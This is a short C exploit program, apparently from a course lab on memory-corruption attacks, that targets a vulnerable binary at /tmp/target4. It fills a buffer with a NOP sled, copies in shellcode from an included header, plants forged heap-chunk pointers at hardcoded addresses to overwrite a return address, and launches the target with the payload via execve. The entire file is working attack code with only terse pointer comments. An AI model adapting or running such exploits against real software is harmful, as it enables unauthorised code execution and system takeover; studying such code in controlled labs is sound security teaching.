#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char sploitstring[1024];
  memset(sploitstring, '\x90', sizeof(sploitstring));
  sploitstring[sizeof(sploitstring) - 1] = 0;
  memcpy(sploitstring + 32, shellcode, strlen(shellcode));
  // p = 0x804a068
  // q = 0x804a268
  // q.bk = eip + 1
  // q.bk.fd = p
  *(int *)(sploitstring + 512 - 8) = 0x0804a068;
  *(int *)(sploitstring + 512 - 4) = 0xbffffa70;
  *(int *)(sploitstring + 4) = -1;
  *(short *)(sploitstring) = 0x0ceb;

  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
